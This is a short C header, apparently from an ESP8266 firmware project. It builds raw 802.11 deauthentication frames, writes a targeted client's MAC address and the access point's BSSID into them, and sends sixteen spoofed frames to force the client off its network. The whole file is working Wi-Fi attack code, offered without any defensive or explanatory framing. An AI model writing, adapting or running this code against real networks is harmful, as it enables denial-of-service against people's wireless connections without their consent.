#ifndef DEAUTH_H
#define DEAUATH_H

#include "esp_functions.h"

/*
 *  Send deauth packets to client.
 */
uint8_t deauth_template[26] = {
  0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
};

void deauth_client(clientinfo ci) {
  uint8_t packet_buffer[64];
  memcpy(packet_buffer, deauth_template, 26);
  memcpy(packet_buffer + 4, ci.station, ETH_MAC_LEN);
  memcpy(packet_buffer + 10, ci.beacon, ETH_MAC_LEN);
  memcpy(packet_buffer + 16, ci.beacon, ETH_MAC_LEN);
  for (uint8_t i = 0; i < 0x10; i++) {
    uint16_t seq = ci.seq + 0x10 * i;
    packet_buffer[22] = seq % 0xFF;
    packet_buffer[23] = seq / 0xFF;
    wifi_send_pkt_freedom(packet_buffer, 26, 0);
    delay(1);
  }
}

#endif
